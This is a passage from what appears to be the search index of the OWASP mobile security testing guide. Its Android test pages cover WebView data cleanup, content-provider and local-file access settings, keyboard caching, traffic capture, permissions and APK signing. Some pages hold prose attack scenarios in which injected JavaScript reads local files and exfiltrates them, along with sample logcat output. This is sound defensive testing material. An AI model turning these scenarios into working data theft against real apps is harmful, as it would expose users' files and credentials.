straightforward, some apps use a pragmatic solution which is to manually delete selected directories known to hold user data. This can be done using the <code>java.io.File</code> API such as <code>java.io.File.deleteRecursively</code>.</p> </li> </ul> <p>Example:</p> <p>This example in Kotlin from the open source Firefox Focus app shows different cleanup steps:</p> <pre><code>override fun cleanup() {\n    clearFormData() // Removes the autocomplete popup from the currently focused form field, if present. Note this only affects the display of the autocomplete popup, it does not remove any saved form data from this WebView's store. To do that, use WebViewDatabase#clearFormData.\n    clearHistory()\n    clearMatches()\n    clearSslPreferences()\n    clearCache(true)\n\n    CookieManager.getInstance().removeAllCookies(null)\n\n    WebStorage.getInstance().deleteAllData() // Clears all storage currently being used by the JavaScript storage APIs. This includes the Application Cache, Web SQL Database and the HTML5 Web Storage APIs.\n\n    val webViewDatabase = WebViewDatabase.getInstance(context)\n    // It isn't entirely clear how this differs from WebView.clearFormData()\n    @Suppress(\"DEPRECATION\")\n    webViewDatabase.clearFormData() // Clears any saved data for web forms.\n    webViewDatabase.clearHttpAuthUsernamePassword()\n\n    deleteContentFromKnownLocations(context) // calls FileUtils.deleteWebViewDirectory(context) which deletes all content in \"app_webview\".\n}\n</code></pre> <p>The function finishes with some extra manual file deletion in <code>deleteContentFromKnownLocations</code> which calls functions from <code>FileUtils</code>. These functions use the <code>java.io.File.deleteRecursively</code> method to recursively delete files from the specified directories.</p> <pre><code>private fun deleteContent(directory: File, doNotEraseWhitelist: Set&lt;String&gt; = emptySet()): Boolean {\n    val filesToDelete = directory.listFiles()?.filter { !doNotEraseWhitelist.contains(it.name) } ?: return false\n    return filesToDelete.all { it.deleteRecursively() }\n}\n</code></pre>","tags":["android","L2","test","MSTG-PLATFORM-10","masvs-platform-2"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0037/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Open a WebView accessing sensitive data and then log out of the application. Access the application's storage container and make sure all WebView related files are deleted. The following files and folders are typically related to WebViews:</p> <ul> <li>app_webview</li> <li>Cookies</li> <li>pref_store</li> <li>blob_storage</li> <li>Session Storage</li> <li>Web Data</li> <li>Service Worker</li> </ul>","tags":["android","L2","test","MSTG-PLATFORM-10","masvs-platform-2"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0250/","title":"MASTG-TEST-0250: References to Content Provider Access in WebViews","text":"","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0250/#overview","title":"Overview","text":"<p>This test checks for references to Content Provider access in WebViews which is enabled by default and can be disabled using the <code>setAllowContentAccess</code> method in the <code>WebSettings</code> class. If improperly configured, this can introduce security risks such as unauthorized file access and data exfiltration.</p> <p>The JavaScript code would have access to any content providers on the device such as:</p> <ul> <li>declared by the app, even if they are not exported.</li> <li>declared by other apps, only if they are exported and if they are not following recommended best practices to restrict access.</li> </ul> <p>Refer to WebView Content Provider Access for more information on the <code>setAllowContentAccess</code> method, the specific files that can be accessed and the conditions under which they can be accessed.</p> <p>Example Attack Scenario:</p> <p>Suppose a banking app uses a WebView to display dynamic content. The developers have not explicitly set the <code>setAllowContentAccess</code> method, so it defaults to <code>true</code>. Additionally, JavaScript is enabled in the WebView as well as the <code>setAllowUniversalAccessFromFileURLs</code> method.</p> <ol> <li>An attacker exploits a vulnerability (such as an XSS flaw) to inject malicious JavaScript into the WebView. This could occur through a compromised or malicious link that the WebView loads without proper validation.</li> <li>Thanks to <code>setAllowUniversalAccessFromFileURLs(true)</code>, the malicious JavaScript can issue requests to <code>content://</code> URIs to read locally stored files or data exposed by content providers. Even those content providers from the app that are not exported can be accessed because the malicious code is running in the same process and same origin as the trusted code.</li> <li>The attacker-controlled script exfiltrates sensitive data from the device to an external server.</li> </ol> <p>Note 1: We do not consider <code>minSdkVersion</code> since <code>setAllowContentAccess</code> defaults to <code>true</code> regardless of the Android version.</p> <p>Note 2: The provider's <code>android:grantUriPermissions</code> attribute is irrelevant in this scenario as it does not affect the app itself accessing its own content providers. It allows other apps to temporary access URIs from the provider even though restrictions such as <code>permission</code> attributes, or <code>android:exported=\"false\"</code> are set. Also, if the app uses a <code>FileProvider</code>, the <code>android:grantUriPermissions</code> attribute must be set to <code>true</code> by definition (otherwise you'll get a <code>SecurityException: Provider must grant uri permissions\"</code>).</p> <p>Note 3: <code>allowUniversalAccessFromFileURLs</code> is critical in the attack since it relaxes the default restrictions, allowing pages loaded from <code>file://</code> to access content from any origin, including <code>content://</code> URIs.</p> <p>If this setting is not enabled, the following error will appear in <code>logcat</code>:</p> <pre><code>[INFO:CONSOLE(0)] \"Access to XMLHttpRequest at 'content://org.owasp.mastestapp.provider/sensitive.txt'\nfrom origin 'null' has been blocked by CORS policy: Cross origin requests are only supported\nfor protocol schemes: http, data, chrome, https, chrome-untrusted.\", source: file:/// (0)\n</code></pre> <p>While the <code>fetch</code> request to the external server would still work, retrieving the file content via <code>content://</code> would fail.</p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0250/#steps","title":"Steps","text":"<ol> <li>Use a tool like semgrep to search for references to:<ul> <li>the <code>WebView</code> class.</li> <li>the <code>WebSettings</code> class.</li> <li>the <code>setJavaScriptEnabled</code> method.</li> <li>the <code>setAllowContentAccess</code> method from the <code>WebSettings</code> class.</li> <li>the <code>setAllowUniversalAccessFromFileURLs</code> method from the <code>WebSettings</code> class.</li> </ul> </li> <li>Obtain all content providers declared in the app's AndroidManifest.xml file.</li> </ol>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0250/#observation","title":"Observation","text":"<p>The output should contain:</p> <ul> <li>A list of WebView instances including the following methods and their arguments:<ul> <li><code>setAllowContentAccess</code></li> <li><code>setJavaScriptEnabled</code></li> <li><code>setAllowUniversalAccessFromFileURLs</code></li> </ul> </li> <li>A list of content providers declared in the app's AndroidManifest.xml file.</li> </ul>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0250/#evaluation","title":"Evaluation","text":"<p>Fail:</p> <p>The test fails if all of the following are true:</p> <ul> <li><code>setJavaScriptEnabled</code> is explicitly set to <code>true</code>.</li> <li><code>setAllowContentAccess</code> is explicitly set to <code>true</code> or not used at all (inheriting the default value, <code>true</code>).</li> <li><code>setAllowUniversalAccessFromFileURLs</code> method is explicitly set to <code>true</code>.</li> </ul> <p>You should use the list of content providers obtained in the observation step to verify if they handle sensitive data.</p> <p>Note: The <code>setAllowContentAccess</code> method being set to <code>true</code> does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack. Therefore, it is recommended to explicitly set it to <code>false</code> if the app does not need to access content providers.</p> <p>Pass:</p> <p>The test passes if any of the following are true:</p> <ul> <li><code>setJavaScriptEnabled</code> is explicitly set to <code>false</code> or not used at all (inheriting the default value, <code>false</code>).</li> <li><code>setAllowContentAccess</code> method is explicitly set to <code>false</code>.</li> <li><code>setAllowUniversalAccessFromFileURLs</code> method is explicitly set to <code>false</code>.</li> </ul>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0250/#mitigations","title":"Mitigations","text":"<ul> <li> Securely Load File Content in a WebView</li> <li> Disable JavaScript in WebViews</li> <li> Disable Content Provider Access in WebViews</li> </ul>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0250/#demos","title":"Demos","text":"<p> MASTG-DEMO-0029: Uses of WebViews Allowing Content Access with semgrep </p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0251/","title":"MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews","text":"","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0251/#overview","title":"Overview","text":"<p>This test is the dynamic counterpart to  References to Content Provider Access in WebViews.</p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0251/#steps","title":"Steps","text":"<ol> <li>Run a dynamic analysis tool like  Frida for iOS and either:<ul> <li>enumerate instances of <code>WebView</code> in the app and list their configuration values</li> <li>or explicitly hook the setters of the <code>WebView</code> settings</li> </ul> </li> </ol>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0251/#observation","title":"Observation","text":"<p>The output should contain a list of WebView instances and corresponding settings.</p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0251/#evaluation","title":"Evaluation","text":"<p>Fail:</p> <p>The test fails if all of the following are true:</p> <ul> <li><code>JavaScriptEnabled</code> is <code>true</code>.</li> <li><code>AllowContentAccess</code> is <code>true</code>.</li> <li><code>AllowUniversalAccessFromFileURLs</code> is <code>true</code>.</li> </ul> <p>You should use the list of content providers obtained in  References to Content Provider Access in WebViews to verify if they handle sensitive data.</p> <p>Note: <code>AllowContentAccess</code> being <code>true</code> does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack. Therefore, it is recommended to explicitly set it to <code>false</code> if the app does not need to access content providers.</p> <p>Pass:</p> <p>The test passes if any of the following are true:</p> <ul> <li><code>JavaScriptEnabled</code> is <code>false</code>.</li> <li><code>AllowContentAccess</code> is <code>false</code>.</li> <li><code>AllowUniversalAccessFromFileURLs</code> is <code>false</code>.</li> </ul>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0251/#mitigations","title":"Mitigations","text":"<ul> <li> Securely Load File Content in a WebView</li> <li> Disable JavaScript in WebViews</li> <li> Disable Content Provider Access in WebViews</li> </ul>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0251/#demos","title":"Demos","text":"<p> MASTG-DEMO-0030: Uses of WebViews Allowing Content Access with Frida </p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0252/","title":"MASTG-TEST-0252: References to Local File Access in WebViews","text":"","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0252/#overview","title":"Overview","text":"<p>This test checks for references to methods from the <code>WebSettings</code> class used by Android WebViews which enable loading content from various sources, including local files. If improperly configured, these methods can introduce security risks such as unauthorized file access and data exfiltration. These methods are:</p> <ul> <li><code>setAllowFileAccess</code>: allows the WebView to load local files from the app's internal storage or external storage.</li> <li><code>setAllowFileAccessFromFileURLs</code>: lets JavaScript within those local files access other local files.</li> <li><code>setAllowUniversalAccessFromFileURLs</code>: removes any cross-origin restrictions, allowing that JavaScript to read data across origins. The JavaScript can always send data to any origin (e.g. via <code>POST</code>), regardless of this setting; this setting only affects reading data (e.g. the code wouldn't get a response to a <code>POST</code> request but the data would still be sent).</li> </ul> <p>When these settings are combined, they can enable an attack in which a malicious HTML file gains elevated privileges, accesses local resources, and exfiltrates data over the network, effectively bypassing the security boundaries typically enforced by the same-origin policy.</p> <p>Even though these methods have secure defaults and are deprecated in Android 10 (API level 29) and later, they can still be explicitly set to <code>true</code> or their insecure defaults may be used in apps that run on older versions of Android (due to their <code>minSdkVersion</code>).</p> <p>Refer to Android WebView Local File Access Settings for more information on these methods (default values, deprecation status, security implications), the specific files that can be accessed, and the conditions under which they can be accessed.</p> <p>Example Attack Scenario:</p> <p>Suppose a banking app uses a WebView to display dynamic content, and the developers enabled all three insecure settings. Additionally, JavaScript is enabled in the WebView.</p> <ol> <li>An attacker injects a malicious HTML file into the device (via phishing or another exploit) into a location that the attacker knows the WebView will access it from (e.g. thanks to reverse engineering). For example, an HTML file used to display the app's terms and conditions.</li> <li>The WebView can load the malicious file because of <code>setAllowFileAccess(true)</code>.</li> <li>Thanks to <code>setJavaScriptEnabled(true)</code> and <code>setAllowFileAccessFromFileURLs(true)</code>, the JavaScript in the malicious file (running in a <code>file://</code> context) is able to access other local files using <code>file://</code> URLs.</li> <li>The attacker-controlled script exfiltrates sensitive data from the device to an external server.</li> </ol> <p>Note 1: Either <code>setAllowFileAccessFromFileURLs</code> or <code>setAllowUniversalAccessFromFileURLs</code> must be set to <code>true</code> for the attack to work. If both settings are set to <code>false</code>, the following error will appear in <code>logcat</code>:</p> <pre><code>[INFO:CONSOLE(0)] \"Access to XMLHttpRequest at 'file:///data/data/org.owasp.mastestapp/files/api-key.txt' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, https, chrome-untrusted.\", source: file:/// (0)\n[INFO:CONSOLE(31)] \"File content sent successfully.\", source: file:/// (31)\n</code></pre> <p>And the server would not receive the file content:</p> <pre><code>[*] Received POST data from 127.0.0.1:\n\nError reading file: 0\n</code></pre> <p>Note 2: As indicated in the Android docs, the value of <code>setAllowFileAccessFromFileURLs</code> is ignored if <code>allowUniversalAccessFromFileURLs=true</code>.</p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0252/#steps","title":"Steps","text":"<ol> <li>Determine the <code>minSdkVersion</code> of the app.</li> <li>Use a tool like semgrep to search for references to:<ul> <li>the <code>WebView</code> class.</li> <li>the <code>WebSettings</code> class.</li> <li>the <code>setJavaScriptEnabled</code> method.</li> <li>the <code>setAllowFileAccess</code>, <code>setAllowFileAccessFromFileURLs</code>, and <code>setAllowUniversalAccessFromFileURLs</code> methods from the <code>WebSettings</code> class.</li> </ul> </li> </ol> <p>Note that in this case the lack of references to the <code>setAllow*</code> methods is especially interesting and must be captured, because it could mean that the app is using the default values, which in some scenarios are insecure. For this reason, it's highly recommended to try to identify every WebView instance in the app.</p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0252/#observation","title":"Observation","text":"<p>The output should contain a list of WebView instances where the abovementioned methods are used.</p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0252/#evaluation","title":"Evaluation","text":"<p>The evaluation of this test is based on the API behavior across different Android versions.</p> <p>Fail:</p> <p>The test fails if:</p> <ul> <li><code>setJavaScriptEnabled</code> is explicitly set to <code>true</code>.</li> <li><code>setAllowFileAccess</code> is explicitly set to <code>true</code> (or not used at all when <code>minSdkVersion</code> &lt; 30, inheriting the default value, <code>true</code>).</li> <li>Either <code>setAllowFileAccessFromFileURLs</code> or <code>setAllowUniversalAccessFromFileURLs</code> is explicitly set to <code>true</code> (or not used at all when <code>minSdkVersion</code> &lt; 16, inheriting the default value, <code>true</code>).</li> </ul> <p>Pass:</p> <p>The test passes if:</p> <ul> <li><code>setJavaScriptEnabled</code> is explicitly set to <code>false</code>.</li> <li><code>setAllowFileAccess</code> is explicitly set to <code>false</code> (or not used at all when <code>minSdkVersion</code> &gt;= 30, inheriting the default value, <code>false</code>).</li> <li>Both <code>setAllowFileAccessFromFileURLs</code> and <code>setAllowUniversalAccessFromFileURLs</code> are explicitly set to <code>false</code> (or not used at all when <code>minSdkVersion</code> &gt;= 16, inheriting the default value, <code>false</code>).</li> </ul>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0252/#mitigations","title":"Mitigations","text":"<ul> <li> Use Up-to-Date minSdkVersion</li> <li> Securely Load File Content in a WebView</li> <li> Disable JavaScript in WebViews</li> </ul>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0252/#demos","title":"Demos","text":"<p> MASTG-DEMO-0032: Uses of WebViews Allowing Local File Access with semgrep </p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0253/","title":"MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews","text":"","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0253/#overview","title":"Overview","text":"<p>This test is the dynamic counterpart to  References to Local File Access in WebViews.</p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0253/#steps","title":"Steps","text":"<ol> <li>Run a dynamic analysis tool like  Frida for iOS and either:<ul> <li>enumerate instances of <code>WebView</code> in the app and list their configuration values</li> <li>or explicitly hook the setters of the <code>WebView</code> settings</li> </ul> </li> </ol>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0253/#observation","title":"Observation","text":"<p>The output should contain a list of WebView instances and corresponding settings.</p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0253/#evaluation","title":"Evaluation","text":"<p>Fail:</p> <p>The test fails if all of the following are true:</p> <ul> <li><code>AllowFileAccess</code> is <code>true</code>.</li> <li><code>AllowFileAccessFromFileURLs</code> is <code>true</code>.</li> <li><code>AllowUniversalAccessFromFileURLs</code> is <code>true</code>.</li> </ul> <p>Note: <code>AllowFileAccess</code> being <code>true</code> does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack. Therefore, it is recommended to explicitly set it to <code>false</code> if the app does not need to access local files.</p> <p>Pass:</p> <p>The test passes if any of the following are true:</p> <ul> <li><code>AllowFileAccess</code> is <code>false</code>.</li> <li><code>AllowFileAccessFromFileURLs</code> is <code>false</code>.</li> <li><code>AllowUniversalAccessFromFileURLs</code> is <code>false</code>.</li> </ul>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0253/#mitigations","title":"Mitigations","text":"<ul> <li> Use Up-to-Date minSdkVersion</li> <li> Securely Load File Content in a WebView</li> <li> Disable JavaScript in WebViews</li> </ul>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0253/#demos","title":"Demos","text":"<p> MASTG-DEMO-0031: Uses of WebViews Allowing Local File Access with Frida </p>","tags":["android","L1","L2","test","MASWE-0069"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0258/","title":"MASTG-TEST-0258: References to Keyboard Caching Attributes in UI Elements","text":"","tags":["android","L2","test","MASWE-0053"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0258/#overview","title":"Overview","text":"<p>This test verifies that the app appropriately configures text input fields to prevent the keyboard from caching sensitive information, such as passwords or personal data.</p> <p>Android apps can configure the behavior of text input fields using XML attributes in the layout files or programmatically in the code. If the app doesn't use non-caching input types for sensitive data, the keyboard may cache sensitive information.</p>","tags":["android","L2","test","MASWE-0053"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0258/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Search for XML attributes in the layout files within the <code>res/layout</code> directory.</li> <li>Search for calls to the <code>setInputType</code> method and the input type values passed to it ( Static Analysis on Android).</li> <li>In case the app uses Jetpack Compose, search for calls to <code>KeyboardOptions</code> constructors and their parameters in the reversed code ( Static Analysis on Android). Especially <code>keyboardType</code> and <code>autoCorrect</code>.</li> </ol>","tags":["android","L2","test","MASWE-0053"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0258/#observation","title":"Observation","text":"<p>The output should include:</p> <ul> <li>All <code>android:inputType</code> XML attributes, if using XML for the UI.</li> <li>All calls to the <code>setInputType</code> method and the input type values passed to it.</li> </ul>","tags":["android","L2","test","MASWE-0053"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0258/#evaluation","title":"Evaluation","text":"<p>The test case fails if there are any fields handling sensitive data for which the app does not use non-caching input types.</p>","tags":["android","L2","test","MASWE-0053"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0206/","title":"MASTG-TEST-0206: Sensitive Data in Network Traffic Capture","text":"","tags":["android","P","test","MASWE-0108"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0206/#overview","title":"Overview","text":"<p>Attackers may capture network traffic from Android devices using an intercepting proxy, such as  ZAP,  Burp Suite, or  mitmproxy, to analyze the data being transmitted by the app. This works even if the app uses HTTPS, as the attacker can install a custom root certificate on the Android device to decrypt the traffic. Inspecting traffic that is not encrypted with HTTPS is even easier and can be done without installing a custom root certificate for example by using  Wireshark.</p> <p>The goal of this test is to verify that sensitive data is not being sent over the network, even if the traffic is encrypted. This test is especially important for apps that handle sensitive data, such as financial or health data, and should be performed in conjunction with a review of the app's privacy policy and the App Store Privacy declarations.</p>","tags":["android","P","test","MASWE-0108"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0206/#steps","title":"Steps","text":"<ol> <li>Start the device.</li> <li>Start logging sensitive data from network traffic ( Logging Sensitive Data from Network Traffic). For example using  mitmproxy.</li> <li>Launch and use the app going through the various workflows while inputting sensitive data wherever you can. Especially, places where you know that will trigger network traffic.</li> </ol>","tags":["android","P","test","MASWE-0108"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0206/#observation","title":"Observation","text":"<p>The output should contain a network traffic sensitive data log that includes the decrypted HTTPS traffic.</p>","tags":["android","P","test","MASWE-0108"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0206/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find the sensitive data you entered in the app that is not stated in the App Store Privacy declarations.</p> <p>Note that this test does not provide any code locations where the sensitive data is being sent over the network. In order to identify the code locations, you can use static analysis tools like  semgrep or dynamic analysis tools like  Frida.</p>","tags":["android","P","test","MASWE-0108"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0206/#demos","title":"Demos","text":"<p> MASTG-DEMO-0009: Detecting Sensitive Data in Network Traffic </p>","tags":["android","P","test","MASWE-0108"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0254/","title":"MASTG-TEST-0254: Dangerous App Permissions","text":"","tags":["android","P","test","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0254/#overview","title":"Overview","text":"<p>In Android apps, permissions are acquired through different methods to access information and system functionalities, including the camera, location, or storage. The necessary permissions are specified in the <code>AndroidManifest.xml</code> file with <code>&lt;uses-permission&gt;</code> tags.</p>","tags":["android","P","test","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0254/#steps","title":"Steps","text":"<p>There are multiple tools that can help in finding permissions in use by an app. Refer  Obtaining Compiler-Provided Security Features to and use any of the mentioned tools.</p> <ol> <li>Extract the <code>AndroidManifest.xml</code> file from the APK (see  Obtaining Information from the AndroidManifest).</li> <li>Obtain the list of declared permissions (see  Obtaining App Permissions).</li> </ol>","tags":["android","P","test","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0254/#observation","title":"Observation","text":"<p>The output shows the list of permissions declared by the app.</p>","tags":["android","P","test","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0254/#evaluation","title":"Evaluation","text":"<p>The test fails if there are any dangerous permissions in the app.</p> <p>Compare the list of declared permissions with the list of dangerous permissions defined by Android. You can find more details in the Android documentation.</p> <p>Context Consideration:</p> <p>Context is essential when evaluating permissions. For example, an app that uses the camera to scan QR codes should have the <code>CAMERA</code> permission. However, if the app does not have a camera feature, the permission is unnecessary and should be removed.</p> <p>Also, consider if there are any privacy-preserving alternatives to the permissions used by the app. For example, instead of using the <code>CAMERA</code> permission, the app could use the device's built-in camera app to capture photos or videos by invoking the <code>ACTION_IMAGE_CAPTURE</code> or <code>ACTION_VIDEO_CAPTURE</code> intent actions. This approach allows the app to access the camera functionality without directly requesting the <code>CAMERA</code> permission, thereby enhancing user privacy.</p>","tags":["android","P","test","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0254/#demos","title":"Demos","text":"<p> MASTG-DEMO-0033: Dangerous Permissions in the AndroidManifest with semgrep </p>","tags":["android","P","test","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0255/","title":"MASTG-TEST-0255: Permission Requests Not Minimized","text":"<p>Placeholder MASTG-TEST</p> <p>This test hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that test by following our guidelines.</p> <p> Check our GitHub Issues for MASTG-TEST-0255</p> <p>If an issue doesn't exist yet, please create one and assign it to yourself or request to be assigned to it.</p>","tags":["android","P","test","placeholder","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0255/#draft-description","title":"Draft Description","text":"<p>This test checks if the app requests permissions that have privacy-preserving alternatives.</p> <p>For more details, check the associated weakness:  Inadequate Permission Management</p>","tags":["android","P","test","placeholder","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0256/","title":"MASTG-TEST-0256: Missing Permission Rationale","text":"<p>Placeholder MASTG-TEST</p> <p>This test hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that test by following our guidelines.</p> <p> Check our GitHub Issues for MASTG-TEST-0256</p> <p>If an issue doesn't exist yet, please create one and assign it to yourself or request to be assigned to it.</p>","tags":["android","P","test","placeholder","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0256/#draft-description","title":"Draft Description","text":"<p>This test checks if the app does not provide a rationale for requesting permissions. See https://developer.android.com/training/permissions/requesting#explain and https://developer.android.com/training/permissions/explaining-access#privacy-dashboard-show-rationale</p> <p>For more details, check the associated weakness:  Inadequate Permission Management</p>","tags":["android","P","test","placeholder","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0257/","title":"MASTG-TEST-0257: Not Resetting Unused Permissions","text":"<p>Placeholder MASTG-TEST</p> <p>This test hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that test by following our guidelines.</p> <p> Check our GitHub Issues for MASTG-TEST-0257</p> <p>If an issue doesn't exist yet, please create one and assign it to yourself or request to be assigned to it.</p>","tags":["android","P","test","placeholder","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-PRIVACY/MASTG-TEST-0257/#draft-description","title":"Draft Description","text":"<p>This test checks if the app does not remove unnecessary access to granted permissions. See https://developer.android.com/training/permissions/requesting#remove-access</p> <p>For more details, check the associated weakness:  Inadequate Permission Management</p>","tags":["android","P","test","placeholder","MASWE-0117"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0038/","title":"MASTG-TEST-0038: Making Sure that the App is Properly Signed","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Usage of Insecure Signature Version</li> <li> Usage of Insecure Signature Key Size</li> </ul>","tags":["android","R","test","MSTG-CODE-1","masvs-resilience-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0038/#overview","title":"Overview","text":"<p>Ensure that the release builds are properly signed to safeguard their integrity and protect them from tampering. Android has evolved its signing schemes over time to enhance security, with newer versions offering more robust mechanisms.</p> <ul> <li>Android 7.0 (API level 24) and above: Use at least the v2 signature scheme, which signs the APK as a whole, providing stronger protection compared to the older v1 (JAR) signing method.</li> <li>Android 9 (API level 28) and above: It's recommended to use both the v2 and v3 signature schemes. The v3 scheme supports key rotation, enabling developers to replace keys in the event of a compromise without invalidating old signatures.</li> <li>Android 11 (API level 30) and above: Optionally include the v4 signature scheme to enable faster incremental updates.</li> </ul> <p>Avoid using the v1 signature scheme (JAR signing) unless absolutely necessary for backward compatibility with Android 6.0 (API level 23) and below as it is considered insecure. For example, it is affected by the Janus vulnerability (CVE-2017-13156), which can allow malicious actors to modify APK files without invalidating the v1 signature. As such, v1 should never be relied on exclusively for devices running Android 7.0 and above.</p> <p>You should also ensure that the APK's code-signing certificate is valid and belongs to the developer.</p> <p>For further guidance, refer to the official Android app signing documentation and best practices for configuring apps for release.</p>","tags":["android","R","test","MSTG-CODE-1","masvs-resilience-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0038/#static-analysis","title":"Static Analysis","text":"<p>APK signatures can be verified with the apksigner tool. It is located at <code>[SDK-Path]/build-tools/[version]/apksigner</code>.</p> <pre><code>$ apksigner verify --verbose example.apk\nVerifies\nVerified using v1 scheme (JAR signing): false\nVerified using v2 scheme (APK Signature Scheme v2): true\nVerified using v3 scheme (APK Signature Scheme v3): true\nVerified using v3.1 scheme (APK Signature Scheme v3.1): false\nVerified using v4 scheme (APK Signature Scheme v4): false\nVerified for SourceStamp: false\nNumber of signers: 1\n</code></pre> <p>The contents of the signing certificate can be also examined with apksigner:</p> <pre><code>$ apksigner verify --print-certs --verbose example.apk\n[...]\nSigner #1 certificate DN: CN=Example Developers, OU=Android, O=Example\nSigner #1 certificate SHA-256 digest: 